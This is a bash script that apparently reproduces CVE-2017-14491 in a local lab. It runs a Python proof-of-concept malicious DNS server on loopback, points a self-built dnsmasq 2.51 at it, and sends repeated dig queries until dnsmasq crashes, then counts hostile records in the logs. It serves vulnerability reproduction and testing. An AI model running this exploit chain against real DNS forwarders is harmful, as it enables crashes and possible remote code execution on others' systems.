#!/usr/bin/env bash
# Repeat the priming N times (Google: crash is non-deterministic) and report the
# first crash, plus how many rounds survived. Honest oracle: liveness + log evidence.
set -u
LAB="$(cd "$(dirname "$0")" && pwd)"; cd "$LAB"
DM="$LAB/dnsmasq-git/src/dnsmasq"; CONF="$LAB/etc/dnsmasq.conf"
ROUNDS="${1:-20}"
ATT_PID=""; DM_PID=""
trap 'kill $ATT_PID $DM_PID 2>/dev/null' EXIT

( exec python2 -u google_cve_2017_14491.py 127.0.0.2 5300 > att_rep.log 2>&1 ) & ATT_PID=$!
sleep 1
"$DM" -C "$CONF" --no-daemon > dm_rep.log 2>&1 & DM_PID=$!
sleep 1.5
if ! kill -0 "$DM_PID" 2>/dev/null; then echo "setup fail"; cat dm_rep.log; exit 1; fi
echo "dnsmasq 2.51 pid=$DM_PID up; rounds=$ROUNDS"

crashed_at=""
for r in $(seq 1 "$ROUNDS"); do
  dig @127.0.0.1 -p 53535 -x 8.8.8.125 +time=2 +tries=1 >/dev/null 2>&1
  sleep 0.25
  if ! kill -0 "$DM_PID" 2>/dev/null; then crashed_at=$r; break; fi
done

echo "=== VERDICT ==="
if [ -n "$crashed_at" ]; then
  echo "  CRASHED on priming round $crashed_at of $ROUNDS  -> CVE-2017-14491 reproducible"
else
  echo "  SURVIVED all $ROUNDS rounds (no crash on this host)"
fi
echo "hostile records consumed by dnsmasq: $(grep -c 'DCBBEEEE' dm_rep.log)"
echo "overflow-name ('ZZZ') parses: $(grep -c 'ZZZ' dm_rep.log)"
echo "attacker handled $(grep -c 'Total Data' att_rep.log) forwarded queries"
